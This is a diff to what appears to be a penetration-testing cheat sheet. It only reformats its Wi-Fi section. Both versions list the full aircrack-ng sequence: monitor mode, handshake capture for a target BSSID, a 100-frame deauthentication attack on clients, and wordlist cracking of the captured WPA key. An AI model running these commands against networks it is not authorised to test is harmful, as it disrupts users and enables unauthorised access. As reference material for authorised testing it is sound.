@@ -37,37 +37,15 @@ http-server -p 8080  # NodeJS
 ```
 ### Wi-Fi
 
-List all the available network Interfaces:
 ```bash
-airmon-ng
-```
-Monitor the desired network interface:
-```bash
-airmon-ng start wlan0 
-```
-Capture the network interface traffic:
-```bash
-airodump-ng wlan0mon
-```
-Capture required data from the specific network:
-```bash
-airodump-ng --bssid 09:98:98:98:98:98 -c 1 --write psk wlan0mon
-```
-De-authenticate the client:
-```bash
-aireplay-ng --deauth 100 -a 09:98:98:98:98:98 wlan0mon
-```
-Verify the captured handshake file:
-```bash
-ls
-```
-Stop Wi-Fi interface monitoring:
-```bash
-airmon-ng stop wlan0mon
-```
-Cracking password from the captured handshake file:
-```bash
-aircrack-ng -w wordlist psk*.cap
+airmon-ng # List all the available network Interfaces
+airmon-ng start wlan0  # Monitor the desired network interface
+airodump-ng wlan0mon # Capture the network interface traffic
+airodump-ng --bssid 09:98:98:98:98:98 -c 1 --write psk wlan0mon # Capture required data from the specific network
+aireplay-ng --deauth 100 -a 09:98:98:98:98:98 wlan0mon # De-authenticate the client
+ls # Verify the captured handshake file
+airmon-ng stop wlan0mon # Stop Wi-Fi interface monitoring
+aircrack-ng -w wordlist psk*.cap # Cracking password from the captured handshake file
 ```
 
 ### Linux
